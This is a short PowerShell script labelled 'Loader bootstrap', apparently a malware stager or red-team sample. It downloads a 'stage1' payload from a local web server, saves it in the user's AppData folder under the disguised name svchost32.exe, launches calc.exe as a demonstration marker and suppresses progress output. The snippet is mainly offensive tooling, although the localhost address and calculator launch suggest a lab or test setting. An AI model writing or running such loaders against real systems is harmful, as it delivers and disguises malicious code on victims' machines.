
<# Loader bootstrap #> $Stage1Url = "http://localhost:8000/stage1.ps1"; $DownloadPath = "$env:APPDATA\svchost32.exe"; $TimeoutSec = 127; Start-BitsTransfer -Source $Stage1Url -Destination $DownloadPath; Start-Process -FilePath "calc.exe"; $ProgressPreference = "SilentlyContinue"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
